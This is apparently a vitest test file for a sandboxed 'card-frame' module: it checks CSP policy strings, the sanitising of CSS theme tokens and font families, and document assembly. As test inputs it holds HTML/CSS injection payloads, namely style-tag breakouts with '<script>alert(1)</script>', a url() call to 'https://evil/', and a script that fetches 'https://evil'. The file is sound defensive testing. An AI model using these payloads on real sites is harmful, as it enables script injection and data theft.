// The card-frame security engine. These are the VERBATIM policy strings two packages build a boundary
// from, so they are asserted whole rather than by `toContain` — a directive silently dropped by a refactor
// is exactly the failure a substring assertion cannot see.

import { buildCardFrameCsp, buildCardFrameDocument, CARD_FRAME_SAFE_FLOOR, clampCardFrameFontFamily, clampCardFrameThemeTokens } from "@orb/kit/card-frame";
import { describe } from "vitest";
import { expect, test } from "../../support/fixtures.ts";

const BASE = "default-src 'none'; img-src {M}; media-src {M}; style-src 'unsafe-inline'; font-src 'self'; form-action 'none'; base-uri 'none'";
const meta = (media: string): string => BASE.replaceAll("{M}", media);
// A bare `http:` SCHEME source (never a `http://` inside a URL) — the thing the policy must never grant.
const PLAIN_HTTP_SCHEME = /\bhttp:(?!\/)/u;
const doc = (media: string): string => `sandbox; ${meta(media)}; frame-ancestors 'self'`;

describe("buildCardFrameCsp — the document (routed) arm", () => {
  test("floors to self-only media, and always carries sandbox + frame-ancestors", () => {
    expect(buildCardFrameCsp(CARD_FRAME_SAFE_FLOOR, "document")).toBe(doc("'self'"));
  });

  test("grants data: ONLY on the trust axis and https: ONLY on the external axis", () => {
    expect(buildCardFrameCsp({ allowExternalMedia: false, allowInlineData: true }, "document")).toBe(doc("'self' data:"));
    expect(buildCardFrameCsp({ allowExternalMedia: true, allowInlineData: false }, "document")).toBe(doc("'self' https:"));
    expect(buildCardFrameCsp({ allowExternalMedia: true, allowInlineData: true }, "document")).toBe(doc("'self' data: https:"));
  });

  test("never emits http: — the app is commonly served over plain-http LAN, so a cleartext subresource is an exfil channel", () => {
    expect(buildCardFrameCsp({ allowExternalMedia: true, allowInlineData: true }, "document")).not.toContain("http:;");
    expect(buildCardFrameCsp({ allowExternalMedia: true, allowInlineData: true }, "document")).not.toMatch(PLAIN_HTTP_SCHEME);
  });
});

describe("buildCardFrameCsp — the meta (srcdoc floor) arm", () => {
  test("omits sandbox + frame-ancestors, which <meta> ignores by spec — a directive that cannot match teaches a lie", () => {
    const policy = buildCardFrameCsp({ allowExternalMedia: true, allowInlineData: false }, "meta");
    expect(policy).toBe(meta("'self' https:"));
    expect(policy).not.toContain("sandbox");
    expect(policy).not.toContain("frame-ancestors");
  });

  test("DROPS data: even when granted — a srcdoc document inherits the app CSP, so the directive could never match", () => {
    expect(buildCardFrameCsp({ allowExternalMedia: false, allowInlineData: true }, "meta")).toBe(meta("'self'"));
  });
});

describe("clampCardFrameThemeTokens", () => {
  test("keeps only `--*` keys whose value is a safe color", () => {
    expect(clampCardFrameThemeTokens({ "--sandbox-bg": "#101014", "--sandbox-fg": "oklch(0.9 0.02 250)" })).toEqual({
      "--sandbox-bg": "#101014",
      "--sandbox-fg": "oklch(0.9 0.02 250)",
    });
  });

  test("drops per-FIELD, never rejecting the whole object — one hostile token must not blank a card's theming", () => {
    expect(clampCardFrameThemeTokens({ "--sandbox-bg": "#101014", "--evil": "url(https://x/)" })).toEqual({ "--sandbox-bg": "#101014" });
  });

  test("drops a value carrying CSS-escape characters — the <style> breakout vector", () => {
    // Each of these would close the `<style>` block or open a new rule if it reached the document.
    expect(clampCardFrameThemeTokens({ "--a": "red}</style><script>x", "--b": "red{", "--c": "red<x" })).toEqual({});
  });

  test("drops non-custom-property keys and non-string values, and survives a non-object", () => {
    expect(clampCardFrameThemeTokens({ color: "#fff", "-x": "#fff" })).toEqual({});
    expect(clampCardFrameThemeTokens({ "--a": 5 })).toEqual({});
    expect(clampCardFrameThemeTokens(["--a", "#fff"])).toEqual({});
    expect(clampCardFrameThemeTokens(null)).toEqual({});
    expect(clampCardFrameThemeTokens("--a: red")).toEqual({});
  });
});

describe("clampCardFrameFontFamily", () => {
  test("accepts a plain family list", () => {
    expect(clampCardFrameFontFamily('Inter, "Helvetica Neue", sans-serif')).toBe('Inter, "Helvetica Neue", sans-serif');
  });

  test("drops anything that could escape the body rule", () => {
    expect(clampCardFrameFontFamily("Inter; } body { background: url(https://evil/)")).toBeUndefined();
    expect(clampCardFrameFontFamily("Inter</style><script>")).toBeUndefined();
    expect(clampCardFrameFontFamily("x".repeat(121))).toBeUndefined();
    expect(clampCardFrameFontFamily(undefined)).toBeUndefined();
    expect(clampCardFrameFontFamily(42)).toBeUndefined();
  });
});

describe("buildCardFrameDocument", () => {
  test("re-clamps on EVERY call — a caller's word for a value is never why it is in the document", () => {
    const html = buildCardFrameDocument({
      html: "<p>hi</p>",
      css: undefined,
      themeTokens: { "--sandbox-bg": "red}</style><script>alert(1)</script>" },
      fontFamily: "Inter; } body {",
    });
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("alert(1)");
    // The font fell back to the guaranteed sans face rather than carrying the hostile list through.
    expect(html).toContain("font-family: sans-serif;");
  });

  test("passes the card body through VERBATIM — the frame is the boundary, not a sanitizer", () => {
    const body = '<div onclick="steal()"><script>fetch("https://evil")</script></div>';
    expect(buildCardFrameDocument({ html: body, css: undefined, themeTokens: undefined, fontFamily: undefined })).toContain(body);
  });

  test("emits the meta policy only when one is supplied — the routed arm's policy lives on the response header", () => {
    const content = { html: "<p>hi</p>", css: undefined, themeTokens: undefined, fontFamily: undefined };
    expect(buildCardFrameDocument(content)).not.toContain("http-equiv");
    expect(buildCardFrameDocument(content, "default-src 'none'")).toContain(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'">`);
  });
});
